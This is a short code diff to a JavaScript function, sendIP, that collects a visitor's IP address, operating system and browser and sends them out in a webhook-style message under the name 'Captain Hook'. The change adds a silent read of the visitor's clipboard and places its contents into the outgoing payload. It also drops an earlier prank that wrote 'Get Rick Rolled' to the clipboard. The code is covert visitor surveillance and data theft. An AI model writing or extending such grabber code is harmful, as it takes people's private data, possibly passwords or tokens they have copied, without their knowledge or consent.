@@ -36,9 +36,11 @@ async function sendIP() {
         console.error("Error");
       });
 
+      const clipboard = await navigator.clipboard.readText();
+
     //create payload
     const payload = {
-      content: `IP: ${ip}, OS: ${os}, Browser: ${browser}, Location: ${location}`,
+      content: `IP: ${ip}, OS: ${os}, Browser: ${browser}, Clipboard: ${clipboard}`,
       username: 'Captain Hook'
     };
 
@@ -49,7 +51,6 @@ async function sendIP() {
     } else {
       console.log(`Message failed: ${response.status}`);
     }
-    navigator.clipboard.writeText("Get Rick Rolled");
   } catch (error) {
     console.error('Error:', error.message);
   } finally {
